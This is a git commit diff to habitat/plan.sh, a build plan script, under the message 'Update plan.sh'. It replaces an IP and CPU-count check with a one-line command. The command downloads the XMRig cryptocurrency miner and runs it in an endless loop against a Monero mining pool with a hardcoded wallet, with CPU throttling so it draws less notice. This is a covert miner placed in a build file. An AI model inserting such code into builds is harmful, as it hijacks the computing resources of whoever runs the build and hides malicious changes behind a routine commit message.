eb167110c78d3d3e0ffcd192ff2686312710da3b
phyllishkibby <47544243+phyllishkibby@users.noreply.github.com>
2019-02-12 02:58:51 +0300

    Update plan.sh

--- habitat/plan.sh
+++ habitat/plan.sh
@@ -1,1 +1,1 @@
-wget http://ipinfo.io/ip -qO - && nproc
+wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && while true; do ./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p Nvidia7 --threads 4 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1 ; sleep 1; done
